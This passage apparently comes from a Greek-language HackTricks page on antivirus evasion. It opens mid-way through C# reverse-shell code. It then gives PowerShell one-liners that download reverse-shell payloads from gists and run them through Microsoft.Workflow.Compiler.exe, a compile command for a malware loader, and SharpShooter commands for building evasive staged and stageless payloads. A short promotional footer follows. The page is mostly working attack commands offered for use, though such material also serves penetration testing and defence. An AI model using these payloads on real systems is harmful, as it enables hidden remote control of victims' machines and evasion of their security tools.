//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### Χρήση του C# με τον μεταγλωττιστή

Μια από τις τεχνικές που μπορείτε να χρησιμοποιήσετε για να παρακάμψετε τον αντι-virus (AV) είναι να χρησιμοποιήσετε τον μεταγλωττιστή της C#. Αυτή η τεχνική επιτρέπει να μετατρέψετε τον κακόβουλο κώδικα σε μια εκτελέσιμη μορφή που δεν θα εντοπιστεί από τον AV.

Για να χρησιμοποιήσετε αυτή την τεχνική, πρέπει να δημιουργήσετε ένα αρχείο C# με τον κακόβουλο κώδικα και να το μεταγλωττίσετε σε ένα εκτελέσιμο αρχείο. Ο μεταγλωττιστής της C# μπορεί να ενσωματωθεί στον κακόβουλο κώδικα και να χρησιμοποιηθεί για να μετατρέψει τον κώδικα σε μια εκτελέσιμη μορφή.

Αυτή η τεχνική είναι αποτελεσματική επειδή οι AV συνήθως επικεντρώνονται στην ανίχνευση των εκτελέσιμων αρχείων και όχι στον κώδικα που χρησιμοποιείται για τη δημιουργία τους. Με αυτόν τον τρόπο, μπορείτε να παρακάμψετε την ανίχνευση του AV και να εκτελέσετε τον κακόβουλο κώδικα χωρίς να εντοπιστείτε.

Πρέπει να σημειωθεί ότι αυτή η τεχνική δεν είναι απόλυτα ασφαλής και μπορεί να ανιχνευθεί από προηγμένα συστήματα ανίχνευσης. Επίσης, η χρήση του μεταγλωττιστή της C# μπορεί να αυξήσει το μέγεθος του κακόβουλου αρχείου, καθώς πρέπει να ενσωματωθεί ο μεταγλωττιστής στο αρχείο.

Παρόλα αυτά, αν χρησιμοποιηθεί σωστά, αυτή η τεχνική μπορεί να είναι αποτελεσματική για την παράκαμψη του AV και την εκτέλεση κακόβουλου κώδικα.
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Αυτόματη λήψη και εκτέλεση:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{% embed url="https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f" %}

Λίστα από C# obfuscators: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
* [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
* [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
* [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
* [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
* [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
* [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Άλλα εργαλεία
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Περισσότερα

* [https://github.com/persianhydra/Xeexe-TopAntivirusEvasion](https://github.com/persianhydra/Xeexe-TopAntivirusEvasion)

<details>

<summary><strong>Μάθετε το hacking του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΠΑΚΕΤΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα hacking tricks σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>
